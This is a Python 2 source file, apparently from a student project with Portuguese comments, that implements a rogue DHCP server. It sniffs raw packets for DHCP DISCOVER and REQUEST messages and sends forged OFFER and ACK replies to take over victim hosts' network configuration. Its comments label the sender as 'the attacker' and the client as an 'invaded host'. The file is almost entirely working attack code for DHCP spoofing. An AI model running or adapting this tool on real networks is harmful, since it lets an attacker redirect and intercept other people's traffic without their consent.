#!/usr/bin/env python


# -*- coding: utf-8 -*-
import socket
import struct
import sys

from data_access import *
# Scripts da representação dos datagramas na pasta /datagrams
from datagrams.dhcp import *
from datagrams.dhcp_in import *
from datagrams.dhcp_out import *
from datagrams.ethernet import *
from datagrams.ip import *
from datagrams.udp import *
from dhcp_config_loader import *
from ipv4_generator import *
# Arquivos utilitários
from util import *

ethernet_mask = "! 6s 6s H"
ipv4_mask = "! 8x B B 2x 4s 4s"
udp_mask = "! H H 2x H"

# Configurações do DHCP Server
configs = DHCPConfigLoader()
interface = configs.interface()
data_access = DataAccess()
ip_generator = IPV4Generator()


# Monta a mensagem DHCP completa com os protocolos de camadas superiores(UDP+IP+ETH)
def build_dhcp_packet(dhcp_type, x_id, ip_offer, client_mac):
    # MAC do cliente e do atacante
    client_mac, local_mac = client_mac, get_local_mac()
    # Monta mensagem DHCP de saída (OFFER ou ACK)
    dhcp_out = DHCPOut(dhcp_type, x_id, ip_offer, client_mac)
    raw_dhcp_packet = dhcp_out.raw_format()
    # protocolos superiores
    udp = UDP(67, 68, len(raw_dhcp_packet))
    raw_udp_packet = udp.raw_format()
    ip_packet = IP(configs.dhcp_server(), '255.255.255.255', udp.length)
    raw_ip_packet = ip_packet.raw_format()
    ethernet_packet = Ethernet('ff:ff:ff:ff:ff:ff', local_mac)
    raw_eth_packet = ethernet_packet.raw_format()
    # Pacote com todos os headers necessários
    return raw_eth_packet + raw_ip_packet + raw_udp_packet + raw_dhcp_packet


def save_host(dhcp_received):
    if dhcp_received.op_host_name != None:
        ip = dhcp_received.op_requested_ip
        host = dhcp_received.op_host_name
        data_access.set_host(ip, host)


def network_spoof():
    try:
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((interface, 0))
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    while 1 == 1:
        packet = s.recvfrom(65576)
        headers = packet[0]
        eth_header = struct.unpack(ethernet_mask, headers[0:14])
        ipv4_header = struct.unpack(ipv4_mask, headers[14:34])
        protocol = ipv4_header[1]

        if protocol == 0x11:
            udp_header = struct.unpack(udp_mask, headers[34:42])
            if udp_header[1] == 67:
                dhcp = DHCPIn(headers[42:282])
                dhcp.get_options(headers[282:])
                transaction = dhcp.transaction

                if dhcp.op_dhcp_type == DHCP_DISCOVERY_CODE:
                    ip_offer = ip_generator.generate_ip()
                    print "Generated IP " + str(ip_offer)
                    dhcp_offer = build_dhcp_packet(DHCP_OFFER_CODE, transaction, ip_offer, dhcp.client_mac)
                    s.send(dhcp_offer)
                elif dhcp.op_dhcp_type == DHCP_REQUEST_CODE:
                    if dhcp.op_dhcp_server == configs.dhcp_server():
                        print("Confirm ip " + dhcp.op_requested_ip)
                        print("Host invadido= " + dhcp.op_host_name)
                        ip_offer = dhcp.op_requested_ip
                        ip_generator.confirm_ip(ip_offer, dhcp.client_mac, dhcp.op_host_name)
                        dhcp_ack = build_dhcp_packet(DHCP_ACK_CODE, transaction, ip_offer, dhcp.client_mac)
                        s.send(dhcp_ack)
                        save_host(dhcp)
                    else:
                        print("Pacote de outro DHCP Server:\n " + str(dhcp))


network_spoof()
